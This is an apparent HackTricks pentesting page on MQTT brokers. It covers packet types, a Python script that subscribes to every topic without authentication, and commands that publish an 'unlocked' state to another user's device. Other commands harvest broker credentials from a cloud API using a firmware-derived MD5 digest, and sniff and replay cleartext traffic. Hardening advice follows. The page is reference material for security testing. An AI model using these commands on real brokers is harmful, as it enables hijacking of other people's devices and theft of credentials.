# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Basic Information

**MQ Telemetry Transport (MQTT)** is known as a **publish/subscribe messaging protocol** that stands out for its extreme simplicity and lightness. This protocol is specifically tailored for environments where devices have limited capabilities and operate over networks that are characterized by low bandwidth, high latency, or unreliable connections. The core objectives of MQTT include minimizing the usage of network bandwidth and reducing the demand on device resources. Additionally, it aims to maintain reliable communication and provide a certain level of delivery assurance. These goals make MQTT exceptionally suitable for the burgeoning field of **machine-to-machine (M2M) communication** and the **Internet of Things (IoT)**, where it's essential to connect a myriad of devices efficiently. Moreover, MQTT is highly beneficial for mobile applications, where conserving bandwidth and battery life is crucial.

**Default port:** 1883

```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```

## Inspecting the traffic

When a **CONNECT** packet is received by MQTT brokers, a **CONNACK** packet is sent back. This packet contains a return code which is crucial for understanding the connection status. A return code of **0x00** means that the credentials have been accepted, signifying a successful connection. On the other hand, a return code of **0x05** signals that the credentials are invalid, thus preventing the connection.

For instance, if the broker rejects the connection due to invalid credentials, the scenario would look something like this:

```
{
  "returnCode": "0x05",
  "description": "Connection Refused, not authorized"
}
```

![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Authentication is totally optional** and even if authentication is being performed, **encryption is not used by default** (credentials are sent in clear text). MITM attacks can still be executed to steal passwords.

To connect to a MQTT service you can use: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) and subscribe yourself to all the topics doing:

```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```

You could also use [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

You can also use:

```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```

Or you could **run this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them**:

```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
	client.subscribe('#', qos=1)
	client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
	print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
	client = mqtt.Client()
	client.on_connect = on_connect
	client.on_message = on_message
	client.connect(HOST, PORT)
	client.loop_start()
	#time.sleep(10)
	#client.loop_stop()

if __name__ == "__main__":
	main()
```

### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

The publish/subscribe model is composed of:

- **Publisher**: publishes a message to one (or many) topic(s) in the broker.
- **Subscriber**: subscribes to one (or many) topic(s) in the broker and receives all the messages sent from the publisher.
- **Broker**: routes all the messages from the publishers to the subscribers.
- **Topic**: consists of one or more levels that are separated by a a forward slash (e.g., /smartshouse/livingroom/temperature).

### Packet Format <a href="#f15a" id="f15a"></a>

Every MQTT packet contains a fixed header (Figure 02).Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): Initiated by the client to request a connection to the server.
- CONNACK (2): The server's acknowledgment of a successful connection.
- PUBLISH (3): Used to send a message from the client to the server or vice versa.
- PUBACK (4): Acknowledgment of a PUBLISH packet.
- PUBREC (5): Part of a message delivery protocol ensuring the message is received.
- PUBREL (6): Further assurance in message delivery, indicating a message release.
- PUBCOMP (7): Final part of the message delivery protocol, indicating completion.
- SUBSCRIBE (8): A client's request to listen for messages from a topic.
- SUBACK (9): The server's acknowledgment of a SUBSCRIBE request.
- UNSUBSCRIBE (10): A client's request to stop receiving messages from a topic.
- UNSUBACK (11): The server's response to an UNSUBSCRIBE request.
- PINGREQ (12): A heartbeat message sent by the client.
- PINGRESP (13): Server's response to the heartbeat message.
- DISCONNECT (14): Initiated by the client to terminate the connection.
- Two values, 0 and 15, are marked as reserved and their use is forbidden.

## IoT/MQTT attack patterns (broker ACLs, cloud APIs, cleartext transport)

The following practical attack flows are commonly seen in consumer IoT stacks that rely on cloud MQTT brokers and mobile apps.

### 1) Predictable device IDs + weak broker ACLs = cross-account control

Many vendors authorize publish/subscribe access based only on the topic pattern, not on device ownership. If device IDs are predictable (e.g., equal to the device MAC), an attacker can control other users’ devices by publishing to their control topics.

- Typical topic layout:
  - Control: `/vendor/<deviceId>/tx`
  - Status: `/vendor/<deviceId>/rx`
- Finding device IDs:
  - Local sniffing: capture Wi‑Fi frames to learn the hub/device MAC (e.g., with airodump-ng).
  - Firmware/UART: boot logs or binaries often print/contain the device ID/MAC.
- Test for weak ACLs by publishing to a foreign deviceId while authenticated with any valid account/broker credentials:

```bash
# Example using mosquitto_pub (plaintext MQTT on a nonstandard port, adjust host/port)
mosquitto_pub -h mq.example.com -p 8001 \
  -i "APP-123456" -u "appUser" -P "appPass" \
  -t "/vendor/d88bCAFEBABE/tx" \
  -m '{"method":"Device.setState","params":{"state":{"lock":"unlocked"}},"targetDevice":"d88bCAFEBABE"}' -d
```

Notes
- If the action succeeds and you are not the owner of the target device, the broker is missing per-device authorization.
- Predictable IDs are frequently MAC-based (check the device OUI) or derived from serials.

### 2) Cloud API credential harvest via firmware-derived secret

Some ecosystems expose undocumented cloud endpoints that return per-device MQTT credentials when given a deviceId plus a digest derived from a hardcoded secret. Reverse engineer the firmware to recover the secret and reproduce the digest.

- Reverse engineering hints:
  - Search for HTTP client code and strings like "/pf/", "/cfg/", "mqtt", "md5", "sha1", "token".
  - Look for code building a string `sprintf("%s_%s", deviceId, SECRET)` then hashing it.
  - Dumped secrets are often reused across models/regions.
  - See also the Firmware Analysis page for extracting and reversing device images:

{{#ref}}
../hardware-physical-access/firmware-analysis/README.md
{{#endref}}

- Reproduce the digest and pull credentials:

```bash
# Example: compute uppercased MD5 of <deviceId><secret>
SECRET="cf50DEADBEEF"; DEV="d88bCAFEBABE";
echo -n "${DEV}${SECRET}" | md5sum | awk '{print toupper($1)}'
# -> 100B65ABCDEF...

# Query the cloud endpoint with deviceId and MD5
curl -s "https://api.example.com/pf/${DEV}/100B65ABCDEF" | jq .
# Expect JSON containing broker URL, clientId/username/password, etc.
```

- Abuse the harvested credentials to subscribe to privileged/admin topics that may leak sensitive info or accept control commands:

```bash
mosquitto_sub -h mq.example.com -p 8001 \
  -i "SG-${DEV}" -u "${DEV}" -P "<brokerPwd>" \
  -t "ylgw*/admin" -v
# Look for Wi‑Fi SSID/password pushes, pairing tokens, debug commands, etc.
```

### 3) Exploiting cleartext MQTT transport (no TLS)

Plaintext MQTT makes credential and payload interception trivial on-path or locally:

- Indicators in captures: strings like "MQTT" or legacy "MQIsdp", clear-text clientId/username/password and topic names.
- Observe and replay commands captured on TCP/1883 or vendor-specific plaintext ports (e.g., 8001):

```bash
# Sniff
sudo tcpdump -i <IFACE> -A -s0 'tcp port 1883 or tcp port 8001'
# Replay a captured control message
mosquitto_pub -h mq.example.com -p 8001 -i "APP-..." -u "..." -P "..." \
  -t "/vendor/<deviceId>/tx" -m '<captured JSON>'
```

If broker ACLs are weak (see 1), cleartext transport amplifies impact by enabling credential reuse and offline analysis.

### 4) Abusing long-lived sessions/tokens

If logout does not invalidate tokens, old MQTT credentials may keep working for days/weeks. Test by reusing historical clientId/username/password values in your MQTT client even after user logout/app reinstall. Some brokers are lax about clientId formats (e.g., overly long IDs or unexpected characters) and will still accept/route messages.

### Detection and hardening ideas

- Enforce per-device ACLs on the broker (e.g., allow publish to `/vendor/<ownDeviceId>/tx` only for the device owner account).
- Make device IDs non-predictable and never equal to MACs/serials; validate `targetDevice` fields server-side.
- Remove undocumented endpoints that mint credentials from easily-derived digests; use HMAC with rotated secrets if needed.
- Require TLS for all MQTT clients (hubs, apps) and validate server certs.
- Shorten session/token lifetimes and invalidate them on logout.
- Network monitoring: alert on outbound plaintext MQTT (tcp/1883 or vendor ports like 8001) and on suspicious topics (e.g., `*/admin`, `/vendor/*/(tx|rx)`).

## Shodan

- `port:1883 MQTT`

## References

- [YoSmart YoLink Hub version 0382 (Bishop Fox)](https://bishopfox.com/blog/yosmart-yolink-hub-version-0382)
- [Aircrack-ng (airodump-ng)](https://www.aircrack-ng.org/)
- [Ghidra SRE](https://ghidra-sre.org/)
- [Eclipse Mosquitto clients](https://mosquitto.org/)

{{#include ../banners/hacktricks-training.md}}